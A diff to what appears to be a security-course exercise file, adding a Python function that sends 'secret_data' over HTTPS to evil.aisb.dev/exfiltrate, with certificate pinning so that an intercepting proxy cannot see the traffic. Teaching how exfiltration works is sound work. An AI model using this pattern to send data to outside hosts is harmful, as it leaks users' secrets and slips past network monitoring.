@@ -76,6 +76,47 @@ test_make_evil_request_https(make_evil_request_https)
 # Update the exfiltrate_data function to use HTTPS
 exfiltrate_data = make_evil_request_https
 
+
+# %%
+def make_evil_request_pinned(secret_data: str) -> Optional[str]:
+    """
+    Send a GET request over HTTPS with certificate pinning to evil.aisb.dev.
+
+    This function uses certificate pinning to ensure we're talking to the real
+    evil.aisb.dev server, not a MITM proxy with a self-signed certificate.
+
+    Args:
+        secret_data: The secret information to exfiltrate
+
+    Returns:
+        The response text from the server, or None if the request fails
+    """
+    try:
+        response = requests.get(
+            "https://evil.aisb.dev/exfiltrate",
+            params={"data": secret_data},
+            timeout=5,
+            verify="isrg-root-x1.pem",
+        )
+    except requests.exceptions.ConnectionError:
+        print("Connection error")
+        return None
+    except FileNotFoundError:
+        print("File not found")
+        return None
+
+    if response.status_code != 200:
+        return None
+    else:
+        return response.text
+
+
+from w1d2_test import test_make_evil_request_pinned
+
+test_make_evil_request_pinned(make_evil_request_pinned)
+
+exfiltrate_data = make_evil_request_pinned
+
 if __name__ == "__main__":  # Only executed when running the script directly
     """
     Make requests to the evil server with different secret data.
